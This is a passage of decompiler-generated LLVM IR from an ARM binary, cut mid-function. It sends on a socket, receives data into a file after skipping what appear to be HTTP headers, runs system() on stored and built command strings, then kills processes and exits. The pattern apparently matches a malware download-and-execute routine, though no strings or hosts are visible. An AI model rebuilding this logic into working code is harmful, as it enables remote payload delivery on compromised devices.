  %v2_1000f498 = add i32 %v2_1000f490, %storemerge11
  %v1_1000f49c = add i32 %v2_1000f498, 1
  br label %dec_label_pc_1000f4a4

dec_label_pc_1000f4a4:                            ; preds = %dec_label_pc_1000f448, %dec_label_pc_1000f488
  %storemerge12 = phi i32 [ %v1_1000f49c, %dec_label_pc_1000f488 ], [ %v2_1000f490, %dec_label_pc_1000f448 ]
  %v2_1000f4ac = load i32, i32* %v1_1000f250, align 4
  %v6_1000f4c8 = call i32 @Send(i32 %v3_1000f1f4, i32 ptrtoint ([276 x i8]* @global_var_1002a18c.49 to i32), i32 %storemerge12, i32 %v2_1000f4ac)
  %v6_1000f4e0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_1002c05c.726 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 268498160, i32* @lr, align 4
  %v2_1000f4ec = call i32 @system(i32 ptrtoint ([11 x i8]* @global_var_1002c07c.727 to i32))
  br i1 %v3_1000f46c, label %dec_label_pc_1000f800, label %dec_label_pc_1000f500

dec_label_pc_1000f500:                            ; preds = %dec_label_pc_1000f4a4
  store i32 268498196, i32* @lr, align 4
  %v4_1000f510 = call i32 @__GI_fopen(i32 ptrtoint ([8 x i8]* @global_var_1002c088.728 to i32), i32 ptrtoint ([3 x i8]* @global_var_1002a2bc.51 to i32))
  %v2_1000f51c = ptrtoint i32* %stack_var_-4136 to i32
  %v2_1000f558 = ptrtoint i32* %stack_var_-5256 to i32
  br label %dec_label_pc_1000f51c

dec_label_pc_1000f51c:                            ; preds = %dec_label_pc_1000f678, %dec_label_pc_1000f500
  store i32 268498228, i32* @lr, align 4
  %v4_1000f530 = call i32 @recv(i32 %v3_1000f1f4, i32 %v2_1000f51c, i32 4096, i32 0)
  %tmp95 = icmp slt i32 %v4_1000f530, 1
  br i1 %tmp95, label %dec_label_pc_1000f698.preheader, label %dec_label_pc_1000f548

dec_label_pc_1000f548:                            ; preds = %dec_label_pc_1000f51c
  %v2_1000f54c = icmp sgt i32 %v4_1000f530, 4095
  br i1 %v2_1000f54c, label %dec_label_pc_1000f574.lr.ph, label %dec_label_pc_1000f554

dec_label_pc_1000f554:                            ; preds = %dec_label_pc_1000f548
  %v2_1000f55c = add i32 %v4_1000f530, %v2_1000f558
  %v3_1000f564 = add i32 %v2_1000f55c, 1120
  %v4_1000f564 = inttoptr i32 %v3_1000f564 to i8*
  store i8 0, i8* %v4_1000f564, align 1
  br label %dec_label_pc_1000f574.lr.ph

dec_label_pc_1000f574.lr.ph:                      ; preds = %dec_label_pc_1000f554, %dec_label_pc_1000f548
  br label %dec_label_pc_1000f574

dec_label_pc_1000f574:                            ; preds = %dec_label_pc_1000f574.lr.ph, %dec_label_pc_1000f678
  %storemerge1353 = phi i32 [ 0, %dec_label_pc_1000f574.lr.ph ], [ %v1_1000f67c, %dec_label_pc_1000f678 ]
  %v2_1000f580 = add i32 %storemerge1353, %v2_1000f51c
  store i32 ptrtoint ([5 x i8]* @global_var_1002a2c0.52 to i32), i32* @r4, align 4
  %v4_1000f594 = inttoptr i32 %v2_1000f580 to i8*
  %v5_1000f594 = call i32 @__GI_strncmp(i8* %v4_1000f594, i32 ptrtoint ([5 x i8]* @global_var_1002a2c0.52 to i32), i32 4)
  %v3_1000f59c = icmp eq i32 %v5_1000f594, 0
  br i1 %v3_1000f59c, label %dec_label_pc_1000f5a4, label %dec_label_pc_1000f678

dec_label_pc_1000f5a4:                            ; preds = %dec_label_pc_1000f574
  %v1_1000f5a8 = add i32 %storemerge1353, 4
  %v2_1000f66c46 = icmp slt i32 %v1_1000f5a8, %v4_1000f530
  br i1 %v2_1000f66c46, label %dec_label_pc_1000f5b4.lr.ph, label %dec_label_pc_1000f698.preheader

dec_label_pc_1000f5b4.lr.ph:                      ; preds = %dec_label_pc_1000f5a4
  %v1_1000f5c0 = add i32 %v4_1000f510, 52
  %v2_1000f5c0 = inttoptr i32 %v1_1000f5c0 to i32*
  %v1_1000f5d0 = add i32 %v4_1000f510, 16
  %v2_1000f5d0 = inttoptr i32 %v1_1000f5d0 to i32*
  %v1_1000f5d8 = add i32 %v4_1000f510, 28
  %v2_1000f5d8 = inttoptr i32 %v1_1000f5d8 to i32*
  br label %dec_label_pc_1000f5b4

dec_label_pc_1000f5b4:                            ; preds = %dec_label_pc_1000f5b4.lr.ph, %dec_label_pc_1000f658
  %storemerge1449 = phi i32 [ %v1_1000f5a8, %dec_label_pc_1000f5b4.lr.ph ], [ %v1_1000f65c, %dec_label_pc_1000f658 ]
  %v3_1000f5c0 = load i32, i32* %v2_1000f5c0, align 4
  %v3_1000f5c4 = icmp eq i32 %v3_1000f5c0, 0
  br i1 %v3_1000f5c4, label %dec_label_pc_1000f638, label %dec_label_pc_1000f5cc

dec_label_pc_1000f5cc:                            ; preds = %dec_label_pc_1000f5b4
  %v3_1000f5d0 = load i32, i32* %v2_1000f5d0, align 4
  store i32 %v3_1000f5d0, i32* %r11.global-to-local, align 4
  %v3_1000f5d8 = load i32, i32* %v2_1000f5d8, align 4
  %v2_1000f5dc = icmp ult i32 %v3_1000f5d0, %v3_1000f5d8
  br i1 %v2_1000f5dc, label %dec_label_pc_1000f5e4, label %dec_label_pc_1000f614

dec_label_pc_1000f5e4:                            ; preds = %dec_label_pc_1000f5cc
  %v3_1000f5e8 = load i32, i32* %v2_1000f5d0, align 4
  store i32 %v3_1000f5e8, i32* %r11.global-to-local, align 4
  %v2_1000f5f4 = add i32 %storemerge1449, %v2_1000f558
  %v1_1000f5f8 = add i32 %v2_1000f5f4, 1120
  %v2_1000f5f8 = inttoptr i32 %v1_1000f5f8 to i8*
  %v3_1000f5f8 = load i8, i8* %v2_1000f5f8, align 1
  %v3_1000f600 = inttoptr i32 %v3_1000f5e8 to i8*
  store i8 %v3_1000f5f8, i8* %v3_1000f600, align 1
  %v0_1000f604 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000f604 = add i32 %v0_1000f604, 1
  store i32 %v1_1000f604, i32* %v2_1000f5d0, align 4
  br label %dec_label_pc_1000f658

dec_label_pc_1000f614:                            ; preds = %dec_label_pc_1000f5cc
  %v2_1000f61c = add i32 %storemerge1449, %v2_1000f558
  %v1_1000f620 = add i32 %v2_1000f61c, 1120
  %v2_1000f620 = inttoptr i32 %v1_1000f620 to i8*
  %v3_1000f620 = load i8, i8* %v2_1000f620, align 1
  store i32 ptrtoint (i32* @global_var_1000f634.729 to i32), i32* @lr, align 4
  %v4_1000f630 = call i32 @putc_unlocked(i8 %v3_1000f620, i32 %v4_1000f510, i32 %v2_1000f61c)
  br label %dec_label_pc_1000f658

dec_label_pc_1000f638:                            ; preds = %dec_label_pc_1000f5b4
  %v2_1000f640 = add i32 %storemerge1449, %v2_1000f558
  %v1_1000f644 = add i32 %v2_1000f640, 1120
  %v2_1000f644 = inttoptr i32 %v1_1000f644 to i8*
  %v3_1000f644 = load i8, i8* %v2_1000f644, align 1
  store i32 268498520, i32* @lr, align 4
  %v4_1000f654 = call i32 @__GI_fputc(i8 %v3_1000f644, i32 %v4_1000f510, i32 %v2_1000f640)
  br label %dec_label_pc_1000f658

dec_label_pc_1000f658:                            ; preds = %dec_label_pc_1000f614, %dec_label_pc_1000f5e4, %dec_label_pc_1000f638
  %v1_1000f65c = add i32 %storemerge1449, 1
  %v2_1000f66c = icmp slt i32 %v1_1000f65c, %v4_1000f530
  br i1 %v2_1000f66c, label %dec_label_pc_1000f5b4, label %dec_label_pc_1000f698.preheader

dec_label_pc_1000f698.preheader:                  ; preds = %dec_label_pc_1000f51c, %dec_label_pc_1000f658, %dec_label_pc_1000f5a4
  %v1_1000f6fc = add i32 %v4_1000f510, 52
  %v2_1000f6fc = inttoptr i32 %v1_1000f6fc to i32*
  %v1_1000f70c = add i32 %v4_1000f510, 16
  %v2_1000f70c = inttoptr i32 %v1_1000f70c to i32*
  %v1_1000f714 = add i32 %v4_1000f510, 28
  %v2_1000f714 = inttoptr i32 %v1_1000f714 to i32*
  br label %dec_label_pc_1000f698

dec_label_pc_1000f678:                            ; preds = %dec_label_pc_1000f574
  %v1_1000f67c = add nuw nsw i32 %storemerge1353, 1
  %v2_1000f68c = icmp slt i32 %v1_1000f67c, %v4_1000f530
  br i1 %v2_1000f68c, label %dec_label_pc_1000f574, label %dec_label_pc_1000f51c

dec_label_pc_1000f698:                            ; preds = %dec_label_pc_1000f794, %dec_label_pc_1000f698.preheader
  store i32 268498608, i32* @lr, align 4
  %v4_1000f6ac = call i32 @recv(i32 %v3_1000f1f4, i32 %v2_1000f51c, i32 4096, i32 0)
  %tmp96 = icmp slt i32 %v4_1000f6ac, 1
  br i1 %tmp96, label %dec_label_pc_1000f7b4, label %dec_label_pc_1000f6c4

dec_label_pc_1000f6c4:                            ; preds = %dec_label_pc_1000f698
  %v2_1000f6c8 = icmp sgt i32 %v4_1000f6ac, 4095
  br i1 %v2_1000f6c8, label %dec_label_pc_1000f6f0.lr.ph, label %dec_label_pc_1000f6d0

dec_label_pc_1000f6d0:                            ; preds = %dec_label_pc_1000f6c4
  %v2_1000f6d8 = add i32 %v4_1000f6ac, %v2_1000f558
  %v3_1000f6e0 = add i32 %v2_1000f6d8, 1120
  %v4_1000f6e0 = inttoptr i32 %v3_1000f6e0 to i8*
  store i8 0, i8* %v4_1000f6e0, align 1
  br label %dec_label_pc_1000f6f0.lr.ph

dec_label_pc_1000f6f0.lr.ph:                      ; preds = %dec_label_pc_1000f6d0, %dec_label_pc_1000f6c4
  br label %dec_label_pc_1000f6f0

dec_label_pc_1000f6f0:                            ; preds = %dec_label_pc_1000f6f0.lr.ph, %dec_label_pc_1000f794
  %storemerge1545 = phi i32 [ 0, %dec_label_pc_1000f6f0.lr.ph ], [ %v1_1000f798, %dec_label_pc_1000f794 ]
  %v3_1000f6fc = load i32, i32* %v2_1000f6fc, align 4
  %v3_1000f700 = icmp eq i32 %v3_1000f6fc, 0
  br i1 %v3_1000f700, label %dec_label_pc_1000f774, label %dec_label_pc_1000f708

dec_label_pc_1000f708:                            ; preds = %dec_label_pc_1000f6f0
  %v3_1000f70c = load i32, i32* %v2_1000f70c, align 4
  store i32 %v3_1000f70c, i32* %r11.global-to-local, align 4
  %v3_1000f714 = load i32, i32* %v2_1000f714, align 4
  %v2_1000f718 = icmp ult i32 %v3_1000f70c, %v3_1000f714
  br i1 %v2_1000f718, label %dec_label_pc_1000f720, label %dec_label_pc_1000f750

dec_label_pc_1000f720:                            ; preds = %dec_label_pc_1000f708
  %v3_1000f724 = load i32, i32* %v2_1000f70c, align 4
  store i32 %v3_1000f724, i32* %r11.global-to-local, align 4
  %v2_1000f730 = add i32 %storemerge1545, %v2_1000f558
  %v1_1000f734 = add i32 %v2_1000f730, 1120
  %v2_1000f734 = inttoptr i32 %v1_1000f734 to i8*
  %v3_1000f734 = load i8, i8* %v2_1000f734, align 1
  %v3_1000f73c = inttoptr i32 %v3_1000f724 to i8*
  store i8 %v3_1000f734, i8* %v3_1000f73c, align 1
  %v0_1000f740 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000f740 = add i32 %v0_1000f740, 1
  store i32 %v1_1000f740, i32* %v2_1000f70c, align 4
  br label %dec_label_pc_1000f794

dec_label_pc_1000f750:                            ; preds = %dec_label_pc_1000f708
  %v2_1000f758 = add i32 %storemerge1545, %v2_1000f558
  %v1_1000f75c = add i32 %v2_1000f758, 1120
  %v2_1000f75c = inttoptr i32 %v1_1000f75c to i8*
  %v3_1000f75c = load i8, i8* %v2_1000f75c, align 1
  store i32 ptrtoint (i32* @global_var_1000f770.730 to i32), i32* @lr, align 4
  %v4_1000f76c = call i32 @putc_unlocked(i8 %v3_1000f75c, i32 %v4_1000f510, i32 %v2_1000f758)
  br label %dec_label_pc_1000f794

dec_label_pc_1000f774:                            ; preds = %dec_label_pc_1000f6f0
  %v2_1000f77c = add i32 %storemerge1545, %v2_1000f558
  %v1_1000f780 = add i32 %v2_1000f77c, 1120
  %v2_1000f780 = inttoptr i32 %v1_1000f780 to i8*
  %v3_1000f780 = load i8, i8* %v2_1000f780, align 1
  store i32 268498836, i32* @lr, align 4
  %v4_1000f790 = call i32 @__GI_fputc(i8 %v3_1000f780, i32 %v4_1000f510, i32 %v2_1000f77c)
  br label %dec_label_pc_1000f794

dec_label_pc_1000f794:                            ; preds = %dec_label_pc_1000f750, %dec_label_pc_1000f720, %dec_label_pc_1000f774
  %v1_1000f798 = add nuw nsw i32 %storemerge1545, 1
  %v2_1000f7a8 = icmp slt i32 %v1_1000f798, %v4_1000f6ac
  br i1 %v2_1000f7a8, label %dec_label_pc_1000f6f0, label %dec_label_pc_1000f698

dec_label_pc_1000f7b4:                            ; preds = %dec_label_pc_1000f698
  store i32 268498876, i32* @lr, align 4
  %v1_1000f7b8 = inttoptr i32 %v4_1000f510 to i16*
  %v2_1000f7b8 = call i32 @__GI_fclose(i16* %v1_1000f7b8)
  %v2_1000f7bc = ptrtoint i32* %stack_var_-5160 to i32
  store i32 %v2_1000f7bc, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 4096, i32* @r5, align 4
  store i32 268498896, i32* @lr, align 4
  %v0_1000f7cc = call i32 @__GI_memset()
  store i32 %v2_1000f7bc, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1000f7fc.733 to i32), i32* @lr, align 4
  %v1_1000f7f8 = call i32 @sprintf(i32 %v2_1000f7bc)
  br label %dec_label_pc_1000faf4

dec_label_pc_1000f800:                            ; preds = %dec_label_pc_1000f4a4
  store i32 268498964, i32* @lr, align 4
  %v4_1000f810 = call i32 @__GI_fopen(i32 ptrtoint ([8 x i8]* @global_var_1002c0d8.734 to i32), i32 ptrtoint ([3 x i8]* @global_var_1002a2bc.51 to i32))
  %v2_1000f81c = ptrtoint i32* %stack_var_-4136 to i32
  %v2_1000f858 = ptrtoint i32* %stack_var_-5256 to i32
  br label %dec_label_pc_1000f81c

dec_label_pc_1000f81c:                            ; preds = %dec_label_pc_1000f978, %dec_label_pc_1000f800
  store i32 268498996, i32* @lr, align 4
  %v4_1000f830 = call i32 @recv(i32 %v3_1000f1f4, i32 %v2_1000f81c, i32 4096, i32 0)
  %tmp97 = icmp slt i32 %v4_1000f830, 1
  br i1 %tmp97, label %dec_label_pc_1000f998.preheader, label %dec_label_pc_1000f848

dec_label_pc_1000f848:                            ; preds = %dec_label_pc_1000f81c
  %v2_1000f84c = icmp sgt i32 %v4_1000f830, 4095
  br i1 %v2_1000f84c, label %dec_label_pc_1000f874.lr.ph, label %dec_label_pc_1000f854

dec_label_pc_1000f854:                            ; preds = %dec_label_pc_1000f848
  %v2_1000f85c = add i32 %v4_1000f830, %v2_1000f858
  %v3_1000f864 = add i32 %v2_1000f85c, 1120
  %v4_1000f864 = inttoptr i32 %v3_1000f864 to i8*
  store i8 0, i8* %v4_1000f864, align 1
  br label %dec_label_pc_1000f874.lr.ph

dec_label_pc_1000f874.lr.ph:                      ; preds = %dec_label_pc_1000f854, %dec_label_pc_1000f848
  br label %dec_label_pc_1000f874

dec_label_pc_1000f874:                            ; preds = %dec_label_pc_1000f874.lr.ph, %dec_label_pc_1000f978
  %storemerge1641 = phi i32 [ 0, %dec_label_pc_1000f874.lr.ph ], [ %v1_1000f97c, %dec_label_pc_1000f978 ]
  %v2_1000f880 = add i32 %storemerge1641, %v2_1000f81c
  store i32 ptrtoint ([5 x i8]* @global_var_1002a2c0.52 to i32), i32* @r4, align 4
  %v4_1000f894 = inttoptr i32 %v2_1000f880 to i8*
  %v5_1000f894 = call i32 @__GI_strncmp(i8* %v4_1000f894, i32 ptrtoint ([5 x i8]* @global_var_1002a2c0.52 to i32), i32 4)
  %v3_1000f89c = icmp eq i32 %v5_1000f894, 0
  br i1 %v3_1000f89c, label %dec_label_pc_1000f8a4, label %dec_label_pc_1000f978

dec_label_pc_1000f8a4:                            ; preds = %dec_label_pc_1000f874
  %v1_1000f8a8 = add i32 %storemerge1641, 4
  %v2_1000f96c34 = icmp slt i32 %v1_1000f8a8, %v4_1000f830
  br i1 %v2_1000f96c34, label %dec_label_pc_1000f8b4.lr.ph, label %dec_label_pc_1000f998.preheader

dec_label_pc_1000f8b4.lr.ph:                      ; preds = %dec_label_pc_1000f8a4
  %v1_1000f8c0 = add i32 %v4_1000f810, 52
  %v2_1000f8c0 = inttoptr i32 %v1_1000f8c0 to i32*
  %v1_1000f8d0 = add i32 %v4_1000f810, 16
  %v2_1000f8d0 = inttoptr i32 %v1_1000f8d0 to i32*
  %v1_1000f8d8 = add i32 %v4_1000f810, 28
  %v2_1000f8d8 = inttoptr i32 %v1_1000f8d8 to i32*
  br label %dec_label_pc_1000f8b4

dec_label_pc_1000f8b4:                            ; preds = %dec_label_pc_1000f8b4.lr.ph, %dec_label_pc_1000f958
  %storemerge1737 = phi i32 [ %v1_1000f8a8, %dec_label_pc_1000f8b4.lr.ph ], [ %v1_1000f95c, %dec_label_pc_1000f958 ]
  %v3_1000f8c0 = load i32, i32* %v2_1000f8c0, align 4
  %v3_1000f8c4 = icmp eq i32 %v3_1000f8c0, 0
  br i1 %v3_1000f8c4, label %dec_label_pc_1000f938, label %dec_label_pc_1000f8cc

dec_label_pc_1000f8cc:                            ; preds = %dec_label_pc_1000f8b4
  %v3_1000f8d0 = load i32, i32* %v2_1000f8d0, align 4
  store i32 %v3_1000f8d0, i32* %r11.global-to-local, align 4
  %v3_1000f8d8 = load i32, i32* %v2_1000f8d8, align 4
  %v2_1000f8dc = icmp ult i32 %v3_1000f8d0, %v3_1000f8d8
  br i1 %v2_1000f8dc, label %dec_label_pc_1000f8e4, label %dec_label_pc_1000f914

dec_label_pc_1000f8e4:                            ; preds = %dec_label_pc_1000f8cc
  %v3_1000f8e8 = load i32, i32* %v2_1000f8d0, align 4
  store i32 %v3_1000f8e8, i32* %r11.global-to-local, align 4
  %v2_1000f8f4 = add i32 %storemerge1737, %v2_1000f858
  %v1_1000f8f8 = add i32 %v2_1000f8f4, 1120
  %v2_1000f8f8 = inttoptr i32 %v1_1000f8f8 to i8*
  %v3_1000f8f8 = load i8, i8* %v2_1000f8f8, align 1
  %v3_1000f900 = inttoptr i32 %v3_1000f8e8 to i8*
  store i8 %v3_1000f8f8, i8* %v3_1000f900, align 1
  %v0_1000f904 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000f904 = add i32 %v0_1000f904, 1
  store i32 %v1_1000f904, i32* %v2_1000f8d0, align 4
  br label %dec_label_pc_1000f958

dec_label_pc_1000f914:                            ; preds = %dec_label_pc_1000f8cc
  %v2_1000f91c = add i32 %storemerge1737, %v2_1000f858
  %v1_1000f920 = add i32 %v2_1000f91c, 1120
  %v2_1000f920 = inttoptr i32 %v1_1000f920 to i8*
  %v3_1000f920 = load i8, i8* %v2_1000f920, align 1
  store i32 ptrtoint (i32* @global_var_1000f934.735 to i32), i32* @lr, align 4
  %v4_1000f930 = call i32 @putc_unlocked(i8 %v3_1000f920, i32 %v4_1000f810, i32 %v2_1000f91c)
  br label %dec_label_pc_1000f958

dec_label_pc_1000f938:                            ; preds = %dec_label_pc_1000f8b4
  %v2_1000f940 = add i32 %storemerge1737, %v2_1000f858
  %v1_1000f944 = add i32 %v2_1000f940, 1120
  %v2_1000f944 = inttoptr i32 %v1_1000f944 to i8*
  %v3_1000f944 = load i8, i8* %v2_1000f944, align 1
  store i32 268499288, i32* @lr, align 4
  %v4_1000f954 = call i32 @__GI_fputc(i8 %v3_1000f944, i32 %v4_1000f810, i32 %v2_1000f940)
  br label %dec_label_pc_1000f958

dec_label_pc_1000f958:                            ; preds = %dec_label_pc_1000f914, %dec_label_pc_1000f8e4, %dec_label_pc_1000f938
  %v1_1000f95c = add i32 %storemerge1737, 1
  %v2_1000f96c = icmp slt i32 %v1_1000f95c, %v4_1000f830
  br i1 %v2_1000f96c, label %dec_label_pc_1000f8b4, label %dec_label_pc_1000f998.preheader

dec_label_pc_1000f998.preheader:                  ; preds = %dec_label_pc_1000f81c, %dec_label_pc_1000f958, %dec_label_pc_1000f8a4
  %v1_1000f9fc = add i32 %v4_1000f810, 52
  %v2_1000f9fc = inttoptr i32 %v1_1000f9fc to i32*
  %v1_1000fa0c = add i32 %v4_1000f810, 16
  %v2_1000fa0c = inttoptr i32 %v1_1000fa0c to i32*
  %v1_1000fa14 = add i32 %v4_1000f810, 28
  %v2_1000fa14 = inttoptr i32 %v1_1000fa14 to i32*
  br label %dec_label_pc_1000f998

dec_label_pc_1000f978:                            ; preds = %dec_label_pc_1000f874
  %v1_1000f97c = add nuw nsw i32 %storemerge1641, 1
  %v2_1000f98c = icmp slt i32 %v1_1000f97c, %v4_1000f830
  br i1 %v2_1000f98c, label %dec_label_pc_1000f874, label %dec_label_pc_1000f81c

dec_label_pc_1000f998:                            ; preds = %dec_label_pc_1000fa94, %dec_label_pc_1000f998.preheader
  store i32 268499376, i32* @lr, align 4
  %v4_1000f9ac = call i32 @recv(i32 %v3_1000f1f4, i32 %v2_1000f81c, i32 4096, i32 0)
  %tmp98 = icmp slt i32 %v4_1000f9ac, 1
  br i1 %tmp98, label %dec_label_pc_1000fab4, label %dec_label_pc_1000f9c4

dec_label_pc_1000f9c4:                            ; preds = %dec_label_pc_1000f998
  %v2_1000f9c8 = icmp sgt i32 %v4_1000f9ac, 4095
  br i1 %v2_1000f9c8, label %dec_label_pc_1000f9f0.lr.ph, label %dec_label_pc_1000f9d0

dec_label_pc_1000f9d0:                            ; preds = %dec_label_pc_1000f9c4
  %v2_1000f9d8 = add i32 %v4_1000f9ac, %v2_1000f858
  %v3_1000f9e0 = add i32 %v2_1000f9d8, 1120
  %v4_1000f9e0 = inttoptr i32 %v3_1000f9e0 to i8*
  store i8 0, i8* %v4_1000f9e0, align 1
  br label %dec_label_pc_1000f9f0.lr.ph

dec_label_pc_1000f9f0.lr.ph:                      ; preds = %dec_label_pc_1000f9d0, %dec_label_pc_1000f9c4
  br label %dec_label_pc_1000f9f0

dec_label_pc_1000f9f0:                            ; preds = %dec_label_pc_1000f9f0.lr.ph, %dec_label_pc_1000fa94
  %storemerge1833 = phi i32 [ 0, %dec_label_pc_1000f9f0.lr.ph ], [ %v1_1000fa98, %dec_label_pc_1000fa94 ]
  store i32 %v4_1000f810, i32* %stack_var_-5256, align 4
  %v3_1000f9fc = load i32, i32* %v2_1000f9fc, align 4
  %v3_1000fa00 = icmp eq i32 %v3_1000f9fc, 0
  br i1 %v3_1000fa00, label %dec_label_pc_1000fa74, label %dec_label_pc_1000fa08

dec_label_pc_1000fa08:                            ; preds = %dec_label_pc_1000f9f0
  %v3_1000fa0c = load i32, i32* %v2_1000fa0c, align 4
  store i32 %v3_1000fa0c, i32* %r11.global-to-local, align 4
  %v3_1000fa14 = load i32, i32* %v2_1000fa14, align 4
  %v2_1000fa18 = icmp ult i32 %v3_1000fa0c, %v3_1000fa14
  br i1 %v2_1000fa18, label %dec_label_pc_1000fa20, label %dec_label_pc_1000fa50

dec_label_pc_1000fa20:                            ; preds = %dec_label_pc_1000fa08
  %v3_1000fa24 = load i32, i32* %v2_1000fa0c, align 4
  store i32 %v3_1000fa24, i32* %r11.global-to-local, align 4
  %v2_1000fa30 = add i32 %storemerge1833, %v2_1000f858
  %v1_1000fa34 = add i32 %v2_1000fa30, 1120
  %v2_1000fa34 = inttoptr i32 %v1_1000fa34 to i8*
  %v3_1000fa34 = load i8, i8* %v2_1000fa34, align 1
  %v3_1000fa3c = inttoptr i32 %v3_1000fa24 to i8*
  store i8 %v3_1000fa34, i8* %v3_1000fa3c, align 1
  %v0_1000fa40 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000fa40 = add i32 %v0_1000fa40, 1
  %v3_1000fa44 = load i32, i32* %stack_var_-5256, align 4
  %v2_1000fa48 = add i32 %v3_1000fa44, 16
  %v3_1000fa48 = inttoptr i32 %v2_1000fa48 to i32*
  store i32 %v1_1000fa40, i32* %v3_1000fa48, align 4
  br label %dec_label_pc_1000fa94

dec_label_pc_1000fa50:                            ; preds = %dec_label_pc_1000fa08
  %v2_1000fa58 = add i32 %storemerge1833, %v2_1000f858
  %v1_1000fa5c = add i32 %v2_1000fa58, 1120
  %v2_1000fa5c = inttoptr i32 %v1_1000fa5c to i8*
  %v3_1000fa5c = load i8, i8* %v2_1000fa5c, align 1
  store i32 ptrtoint (i32* @global_var_1000fa70.736 to i32), i32* @lr, align 4
  %v4_1000fa6c = call i32 @putc_unlocked(i8 %v3_1000fa5c, i32 %v4_1000f810, i32 %v2_1000fa58)
  br label %dec_label_pc_1000fa94

dec_label_pc_1000fa74:                            ; preds = %dec_label_pc_1000f9f0
  %v2_1000fa7c = add i32 %storemerge1833, %v2_1000f858
  %v1_1000fa80 = add i32 %v2_1000fa7c, 1120
  %v2_1000fa80 = inttoptr i32 %v1_1000fa80 to i8*
  %v3_1000fa80 = load i8, i8* %v2_1000fa80, align 1
  store i32 268499604, i32* @lr, align 4
  %v4_1000fa90 = call i32 @__GI_fputc(i8 %v3_1000fa80, i32 %v4_1000f810, i32 %v2_1000fa7c)
  br label %dec_label_pc_1000fa94

dec_label_pc_1000fa94:                            ; preds = %dec_label_pc_1000fa50, %dec_label_pc_1000fa20, %dec_label_pc_1000fa74
  %v1_1000fa98 = add nuw nsw i32 %storemerge1833, 1
  %v2_1000faa8 = icmp slt i32 %v1_1000fa98, %v4_1000f9ac
  br i1 %v2_1000faa8, label %dec_label_pc_1000f9f0, label %dec_label_pc_1000f998

dec_label_pc_1000fab4:                            ; preds = %dec_label_pc_1000f998
  store i32 268499644, i32* @lr, align 4
  %v1_1000fab8 = inttoptr i32 %v4_1000f810 to i16*
  %v2_1000fab8 = call i32 @__GI_fclose(i16* %v1_1000fab8)
  %v2_1000fabc = ptrtoint i32* %stack_var_-5160 to i32
  store i32 %v2_1000fabc, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 4096, i32* @r5, align 4
  store i32 268499664, i32* @lr, align 4
  %v0_1000facc = call i32 @__GI_memset()
  store i32 188, i32* %r11.global-to-local, align 4
  store i32 %v2_1000fabc, i32* @r3, align 4
  store i32 ptrtoint ([188 x i8]* @global_var_1002c0e0.737 to i32), i32* @r4, align 4
  store i32 188, i32* @r5, align 4
  store i32 268499700, i32* @lr, align 4
  %v0_1000faf0 = call i32 @memcpy()
  br label %dec_label_pc_1000faf4

dec_label_pc_1000faf4:                            ; preds = %dec_label_pc_1000f7b4, %dec_label_pc_1000fab4
  %v2_1000fb04.pre-phi = phi i32 [ %v2_1000f7bc, %dec_label_pc_1000f7b4 ], [ %v2_1000fabc, %dec_label_pc_1000fab4 ]
  store i32 268499708, i32* @lr, align 4
  %v1_1000faf8 = call i32 @close(i32 %arg1)
  store i32 268499716, i32* @lr, align 4
  %v1_1000fb00 = call i32 @close(i32 %v3_1000f1f4)
  store i32 ptrtoint ([3 x i8]* @global_var_1000fb10.738 to i32), i32* @lr, align 4
  %v1_1000fb0c = call i32 @system(i32 %v2_1000fb04.pre-phi)
  store i32 ptrtoint ([3 x i8]* @global_var_1000fb1c.739 to i32), i32* @lr, align 4
  %v2_1000fb18 = call i32 @kill(i32 9, i32 0)
  %v0_1000fb20 = call i32 @__GI_exit()
  br label %dec_label_pc_1000fb24

dec_label_pc_1000fb24:                            ; preds = %entry, %dec_label_pc_1000faf4
  %v0_1000fb3c = phi i32 [ %v1_1000f1ac, %entry ], [ %v0_1000fb20, %dec_label_pc_1000faf4 ]
  %v2_1000fb24 = load i32, i32* %stack_var_-5264, align 4
  store i32 %v2_1000fb24, i32* %r11.global-to-local, align 4
  ret i32 %v0_1000fb3c

; uselistorder directives
  uselistorder i32 %storemerge1833, { 3, 0, 1, 2 }
  uselistorder i32 %v4_1000f9ac, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge1737, { 3, 0, 1, 2 }
  uselistorder i32 %storemerge1641, { 2, 0, 1 }
  uselistorder i32 %v4_1000f830, { 3, 0, 1, 2, 4, 5 }
  uselistorder i32 %v2_1000f81c, { 1, 0, 2 }
  uselistorder i32 %v4_1000f810, { 11, 0, 1, 9, 3, 2, 10, 7, 4, 6, 5, 8 }
  uselistorder i32 %storemerge1545, { 3, 0, 1, 2 }
  uselistorder i32 %v4_1000f6ac, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge1449, { 3, 0, 1, 2 }
  uselistorder i32 %storemerge1353, { 2, 0, 1 }
  uselistorder i32 %v4_1000f530, { 3, 0, 1, 2, 4, 5 }
  uselistorder i32 %v2_1000f51c, { 1, 0, 2 }
  uselistorder i32 %v4_1000f510, { 10, 8, 5, 7, 6, 9, 3, 0, 2, 1, 4 }
  uselistorder i32 %v2_1000f490, { 1, 0 }
  uselistorder i32 %storemerge11, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v3_1000f1f4, { 2, 3, 4, 0, 1, 5, 6, 7 }
  uselistorder i32 %arg2, { 2, 1, 3, 4, 0, 5 }
  uselistorder i32 %arg1, { 2, 3, 1, 4, 5, 0 }
  uselistorder label %dec_label_pc_1000fb24, { 1, 0 }
  uselistorder label %dec_label_pc_1000faf4, { 1, 0 }
  uselistorder label %dec_label_pc_1000fa94, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000f9f0, { 1, 0 }
  uselistorder label %dec_label_pc_1000f998.preheader, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000f958, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000f8b4, { 1, 0 }
  uselistorder label %dec_label_pc_1000f874, { 1, 0 }
  uselistorder label %dec_label_pc_1000f794, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000f6f0, { 1, 0 }
  uselistorder label %dec_label_pc_1000f698.preheader, { 1, 2, 0 }
